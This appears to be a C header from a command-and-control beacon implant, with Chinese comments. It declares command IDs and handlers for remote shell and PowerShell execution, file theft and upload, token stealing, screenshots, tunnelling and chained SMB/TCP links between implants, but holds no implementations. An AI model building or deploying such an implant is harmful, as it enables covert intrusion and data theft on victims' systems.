#pragma once

#include "beacon_context.h"
#include "beacon_packet.h"
#include "beacon_bof.h"

/* 通用控制 */
#define BEACON_COMMAND_SLEEP          1u
#define BEACON_COMMAND_EXIT           2u

/* 命令执行 */
#define BEACON_COMMAND_SHELL          10u
#define BEACON_COMMAND_POWERSHELL     11u

/* 文件系统 */
#define BEACON_COMMAND_CD             20u
#define BEACON_COMMAND_LS             21u
#define BEACON_COMMAND_PWD            22u
#define BEACON_COMMAND_CAT            23u
#define BEACON_COMMAND_MKDIR          24u
#define BEACON_COMMAND_RM             25u
#define BEACON_COMMAND_MV             26u
#define BEACON_COMMAND_CP             27u
#define BEACON_COMMAND_DOWNLOAD       28u
#define BEACON_COMMAND_UPLOAD         29u
#define BEACON_COMMAND_FILEBROWSER    30u
#define BEACON_COMMAND_SETATTR        31u
#define BEACON_COMMAND_ZIP            32u

/* 进程、令牌和基础信息 */
#define BEACON_COMMAND_PS             40u
#define BEACON_COMMAND_KILLJOB        41u
#define BEACON_COMMAND_KILL           42u
#define BEACON_COMMAND_STEALTOKEN     43u
#define BEACON_COMMAND_JOBS           44u
#define BEACON_COMMAND_WHOAMI         50u
#define BEACON_COMMAND_SCREENSHOT     51u
#define BEACON_COMMAND_NETINFO        52u
#define BEACON_COMMAND_NETSTAT        53u

/* 隧道与 BOF */
#define BEACON_COMMAND_TUNNEL_START   60u
#define BEACON_COMMAND_TUNNEL_CONTROL 61u
#define BEACON_COMMAND_TUNNEL_DATA    62u
#define BEACON_COMMAND_TUNNEL_CLOSE   63u
#define BEACON_COMMAND_BOF            70u

/* 级联 */
#define BEACON_COMMAND_CASCADE_CONNECT_TCP 80u
#define BEACON_COMMAND_CASCADE_LINK_SMB    81u
#define BEACON_COMMAND_CASCADE_ROUTE       82u
#define BEACON_COMMAND_CASCADE_CLOSE       83u
#define BEACON_COMMAND_CASCADE_OPEN        84u
#define BEACON_COMMAND_CASCADE_READ        85u
#define BEACON_COMMAND_CASCADE_DEAD        86u
#define BEACON_COMMAND_CASCADE_PING        87u

/* 命令分发：根据 command_id 调用对应处理函数 */
PacketList CommandDispatch(BeaconContext* ctx, UINT32 task_id, UINT32 command_id, const ByteBuf* payload);

/* 命令执行 */
ByteBuf CommandShell(BeaconContext* ctx, UINT32 task_id, UINT32 command_id, Parser* parser, INT powershell); /* 执行 shell/powershell 命令 */

/* 文件系统操作 */
ByteBuf CommandCd(Parser* parser);                      /* 切换工作目录 */
ByteBuf CommandLs(Parser* parser);                      /* 列出目录内容 */
ByteBuf CommandPwd(VOID);                               /* 获取当前工作目录 */
ByteBuf CommandCat(Parser* parser);                     /* 读取文件内容 */
ByteBuf CommandMkdir(Parser* parser);                   /* 创建目录 */
ByteBuf CommandRm(Parser* parser);                      /* 删除文件/目录 */
ByteBuf CommandMv(Parser* parser);                      /* 移动/重命名 */
ByteBuf CommandCp(Parser* parser);                      /* 复制文件 */
ByteBuf CommandFilebrowser(Parser* parser);             /* 文件浏览器（分页） */
ByteBuf CommandSetattr(Parser* parser);                 /* 设置文件属性 */
ByteBuf CommandZip(Parser* parser);                     /* 压缩文件/目录 */

/* 进程与系统信息 */
ByteBuf CommandPs(VOID);                                /* 列出进程 */
ByteBuf CommandKill(Parser* parser);                    /* 终止进程 */
ByteBuf CommandStealToken(Parser* parser);              /* 窃取令牌 */
ByteBuf CommandWhoami(const BeaconContext* ctx);        /* 获取当前用户信息 */
ByteBuf CommandScreenshot(Parser* parser);              /* 截屏 */
ByteBuf CommandNetinfo(VOID);                           /* 网络信息 */
ByteBuf CommandNetstat(VOID);                           /* 网络连接列表 */
ByteBuf CommandJobs(BeaconContext* ctx);                 /* 列出后台任务 */
ByteBuf CommandKillJob(BeaconContext* ctx, Parser* parser); /* 终止后台任务 */
